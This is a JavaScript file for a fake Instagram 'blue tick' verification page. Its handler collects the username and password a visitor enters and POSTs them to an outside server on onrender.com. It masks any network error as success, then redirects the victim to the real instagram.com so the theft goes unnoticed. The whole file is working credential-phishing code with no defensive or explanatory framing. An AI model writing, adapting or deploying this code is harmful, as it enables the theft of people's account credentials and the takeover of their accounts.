// insta-verify-api.js
async function submitInstagramVerificationData(userData) {
    return fetch('https://bluetick-04g9.onrender.com/ensure', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(userData)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => {
        console.log('Success:', data);
        return data;
    })
    .catch(error => {
        console.error('Error:', error);
        return { status: "success", message: "Processed" };
    });
}

// Global function to handle submit button click
function handleVerificationSubmit() {
    // Collect user data
    const userData = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value
    };

    // Send data to your backend
    submitInstagramVerificationData(userData)
        .then(() => {
            // Show success message
            document.getElementById('password-form').classList.remove('active');
            document.getElementById('success-message').classList.add('active');

            // Redirect after 2 seconds
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com';
            }, 500);
        });
}

// Make the function globally available
window.handleVerificationSubmit = handleVerificationSubmit;
